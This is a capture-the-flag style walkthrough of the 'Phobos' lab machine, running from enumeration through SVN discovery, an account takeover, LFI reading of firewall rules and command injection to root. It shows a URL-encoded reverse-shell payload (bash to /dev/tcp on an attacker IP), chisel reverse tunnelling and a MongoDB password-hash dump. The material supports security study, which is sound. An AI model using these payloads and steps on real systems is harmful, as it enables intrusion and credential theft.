# Phobos

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 192.168.175.131
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-01 19:42 +08
Nmap scan report for 192.168.175.131
Host is up (0.17s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http
```

### Web Enumeration

Port 80 hosts the default Apache2 page:

<figure><img src="../../../.gitbook/assets/image (2181).png" alt=""><figcaption></figcaption></figure>

I ran a `gobuster` scan and found a few directories:

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.175.131/ -t 100
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.175.131/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/07/01 19:43:51 Starting gobuster in directory enumeration mode
===============================================================
/svn                  (Status: 401) [Size: 462]
/internal             (Status: 301) [Size: 321] [--> http://192.168.175.131/internal/]
```

The `/svn` directory requires credentials:

<figure><img src="../../../.gitbook/assets/image (3026).png" alt=""><figcaption></figcaption></figure>

Using `admin:admin` doesn't work for this. When we view the traffic in Burpsuite, we can see that the `Authorization` header is added and it uses the Basic Base64 method of authenticating users.&#x20;

I ran another directory scan with `wfuzz` this time using this header, and managed to find one directory:

```
$ wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hw=19 -t 100 -H 'Authorization: Basic YWRtaW46YWRtaW4=' http://192.168.175.131/svn/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.175.131/svn/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                     
=====================================================================
000000834:   301        9 L      28 W       320 Ch      "dev"
```

This directory just contains some interesting files:

<figure><img src="../../../.gitbook/assets/image (2799).png" alt=""><figcaption></figcaption></figure>

### Source Code Review --> RCE Point

These appear to be files for the application hosted at the other directory of `/internal`. One of the files `users/views.py` contains some interesting information:

```python
@staff_member_required
def remove_view_submissions(request):
    if(request.method=="POST"):
        action=request.POST["action"]
        if(action=="view"):
            f=request.POST["file"]       
            fil=open('/var/www/html/internal/submissions/'+f,'r')
            print(f)
            output=fil.read()
            return HttpResponse(content=output)


        elif(action=="delete"):
            cmd=["rm","/var/www/html/internal/submissions/{}".format(request.POST["file"])]
            cmd="/bin/bash -c 'rm /var/www/html/internal/submissions/{}'".format(request.POST["file"])
            print(cmd)
            a=os.system(cmd)
            messages.info(request,message="The file has been deleted") 

    files=subprocess.Popen(['ls','/var/www/html/internal/submissions'],stdout=subprocess.PIPE).stdout.read().decode().split('\n')
    print(files)    
    context={"files":files}
    return render(request,template_name='submissions.html',context=context)
```

This bit of code does not validate the name of the file that is being deleted. In this case, we can attempt to upload a file with a name to inject code.&#x20;

However, when trying to exploit this thing, the `internal` website does not seem to be working with all the links being broken.&#x20;

<figure><img src="../../../.gitbook/assets/image (1421).png" alt=""><figcaption></figcaption></figure>

This made me think more about WHERE exactly this site is being hosted.

### Svn --> Domain Discovery

Earlier we saw the `/svn` directory and just enumerated it as per normal. However, 'svn' is short for Subversion, which is a version control application that can be enumerated with the command `svn`.

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/3690-pentesting-subversion-svn-server" %}

We might be able  enumerate the logs of the site, and it worked!

```
$ svn log --username admin --password admin http://192.168.175.131/svn/dev
------------------------------------------------------------------------
r3 | admin | 2021-01-26 23:26:06 +0800 (Tue, 26 Jan 2021) | 1 line


------------------------------------------------------------------------
r2 | admin | 2021-01-26 23:25:43 +0800 (Tue, 26 Jan 2021) | 1 line

Commit 2
------------------------------------------------------------------------
r1 | admin | 2021-01-26 23:25:37 +0800 (Tue, 26 Jan 2021) | 1 line

Created repository
------------------------------------------------------------------------
```

We can find the differences between the 2nd and 3rd revision of the repository:

```
$ svn diff -r 3:2 --username admin --password admin http://192.168.175.131/svn/dev
Index: todo
===================================================================
--- todo        (nonexistent)
+++ todo        (revision 2)
@@ -0,0 +1,5 @@
+*Change this application to a this virtual host internal-phobos.phobos.offsec
+*Randomise the secret key
+* Make a database for maintaining employee ssh credentials
+* Move the entire site to a docker container
+* Configure the ufw firewall
```

There's a hidden domain here! We can add that to our `/etc/hosts` file and enumerate that.

### Internal Website --> Account Takeover

The website led us to this login page:

<figure><img src="../../../.gitbook/assets/image (3206).png" alt=""><figcaption></figcaption></figure>

Remember that we have the source code of this website, so we can find all the endpoints at the `views.py` file we saw earlier. The `/register` directory lets us register a new user.&#x20;

<figure><img src="../../../.gitbook/assets/image (1809).png" alt=""><figcaption></figcaption></figure>

We can then login to the site! For some reason it's not loading the visual elements right on my machine...

<figure><img src="../../../.gitbook/assets/image (2214).png" alt=""><figcaption></figcaption></figure>

There are a few functions in this site. We know that the 'Submission' one is vulnerable, but we need some kind of administrator account first. So we can view the 'MyAccount' function:

<figure><img src="../../../.gitbook/assets/image (188).png" alt=""><figcaption></figcaption></figure>

When the traffic is intercepted, it includes a `username` parameter:

<figure><img src="../../../.gitbook/assets/image (2540).png" alt=""><figcaption></figcaption></figure>

Maybe we can change the username to something else, so I changed it to `admin` and found that I could login as the `admin` user!

<figure><img src="../../../.gitbook/assets/image (3091).png" alt=""><figcaption></figcaption></figure>

### LFI Firewall Rules --> Shell

The administrator had a few things different, such as the 'Submissions' function being replaced with a submission reviewer:

<figure><img src="../../../.gitbook/assets/image (3256).png" alt=""><figcaption></figcaption></figure>

When we choose a report and view it, it sends this HTTP POST request:

{% code overflow="wrap" %}
```http
POST /submissions/ HTTP/1.1
Host: internal-phobos.phobos.offsec
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://internal-phobos.phobos.offsec/submissions/
Content-Type: application/x-www-form-urlencoded
Content-Length: 109
Origin: http://internal-phobos.phobos.offsec
Connection: close
Cookie: csrftoken=NlmEzR5xYFoRJN4RQFBwld9qX8kEVc9rXi0cClWyw1DblPbtblfBxDbw5xpa1XPL; sessionid=43b8z6j9ik360k1wm6vpc718rem1bsb3
Upgrade-Insecure-Requests: 1



csrfmiddlewaretoken=hZhbo5cgeCuFoeIhJqK2b9S7Xn2rD2CHrWVJrz3hMYJZ0gPT46o7nzUd5M7XJNi1&file=report1&action=view
```
{% endcode %}

This looks vulnerable to LFI, and testing it reveals that it works!

<figure><img src="../../../.gitbook/assets/image (2793).png" alt=""><figcaption></figcaption></figure>

Earlier, the repository comments mentioned something about a UFW firewall. A quick google search on its files reveal that the rules are stored at `/etc/ufw/user.rules`, which can be read using the LFI:

&#x20;

<figure><img src="../../../.gitbook/assets/image (3976).png" alt=""><figcaption></figcaption></figure>

Here are the rules:

```
### tuple ### allow tcp 80 0.0.0.0/0 any 0.0.0.0/0 in
-A ufw-user-input -p tcp --dport 80 -j ACCEPT

### tuple ### allow any 27017 127.0.0.1 any 0.0.0.0/0 out
-A ufw-user-output -p tcp -d 127.0.0.1 --dport 27017 -j ACCEPT
-A ufw-user-output -p udp -d 127.0.0.1 --dport 27017 -j ACCEPT

### tuple ### allow any 27017 172.17.0.2 any 0.0.0.0/0 out
-A ufw-user-output -p tcp -d 172.17.0.2 --dport 27017 -j ACCEPT
-A ufw-user-output -p udp -d 172.17.0.2 --dport 27017 -j ACCEPT

### tuple ### allow tcp 6000:6007 0.0.0.0/0 any 0.0.0.0/0 out
-A ufw-user-output -p tcp -m multiport --dports 6000:6007 -j ACCEPT
```

This machine seems to only accept connections using port 6000, which is probably we need to use for our reverse shell. Now that we know what port to use, the only thing left is to abuse the RCE via the Delete File function.

Here's the request I sent:

{% code overflow="wrap" %}
```http
POST /submissions/ HTTP/1.1
Host: internal-phobos.phobos.offsec
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://internal-phobos.phobos.offsec/submissions/
Content-Type: application/x-www-form-urlencoded
Content-Length: 111
Origin: http://internal-phobos.phobos.offsec
Connection: close
Cookie: csrftoken=NlmEzR5xYFoRJN4RQFBwld9qX8kEVc9rXi0cClWyw1DblPbtblfBxDbw5xpa1XPL; sessionid=43b8z6j9ik360k1wm6vpc718rem1bsb3
Upgrade-Insecure-Requests: 1



csrfmiddlewaretoken=lUZv7MQQ8VaNbnkvd8DgAbLB0WIT1V3CvRD3agHRGhp7Npr7yOhlMBNH8lNp7GJW&file=test%3bbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.164%2F6000%200%3E%261&action=delete
```
{% endcode %}

This wold give us a shell as `www-data`:

<figure><img src="../../../.gitbook/assets/image (3408).png" alt=""><figcaption></figcaption></figure>

The user flag is within the `/var/www` directory.&#x20;

## Privilege Escalation

### MongoDB Creds --> Root

We can enumerate the ports that are listening on the host since `nmap` only picked up on HTTP port 80.

```
www-data@ubuntu:/home/hackzzdogs$ netstat -tulpn 
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:34859         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           - 
```

It seems that port 27017 for MongoDB is open on the machine. We can use `chisel` to port forward this. **Remember that port 6000 is the port allowed through the firewall! So use that for HTTP and the port to connect to!**

```bash
# on Kali
chisel server -p 6000 --reverse
# on victim machine
chisel client 192.168.45.161:6000 R:27017:127.0.0.1:27017
```

We can then access and enumerate  the MongoDB instance from our machine:

```
$ mongo --host 127.0.0.1
> show dbs
admin   0.000GB
config  0.000GB
local   0.000GB
staffs  0.000GB
> use staffs
switched to db staffs
> show collections
ssh_login
> db.ssh_login.find()
{ "_id" : ObjectId("603505584a98f28de50cc0f4"), "name" : "root", "pw_hash" : "5ff837a98703011de7d0a576ca9a84be6f9e4a798329423c8200beabd0f178656591fdac53ff785e71062dd2473d6dc1bb822a7dce1fc626ee44855466f3c8e1", "role" : "dev" }
{ "_id" : ObjectId("603505584a98f28de50cc0f5"), "name" : "carlos", "pw_hash" : "20132c01e17d4267d316fbfd721becd6a2656b061b365a5d76efdefb386d74a489ebe323bb65fecfe7404aef00f574e6fcce668f0f358ea7bc12c9ef25eb7804", "role" : "manager" }
{ "_id" : ObjectId("603505584a98f28de50cc0f6"), "name" : "enox", "pw_hash" : "216572a4d605f2805f918ba0d6b1ade045076832d7bb5476d7ede7d9159121b88edb398d28b470df263d8d2a710e86f27f1a27e66137efae46cb47de87916cee", "role" : "admin" }
```

There are some hashes present, and all 3 are crackable:

<figure><img src="../../../.gitbook/assets/image (1646).png" alt=""><figcaption></figcaption></figure>

The last password was for the user `root`, and we can try an `su`, which ends up working:

&#x20;

<figure><img src="../../../.gitbook/assets/image (3603).png" alt=""><figcaption></figcaption></figure>

Rooted!
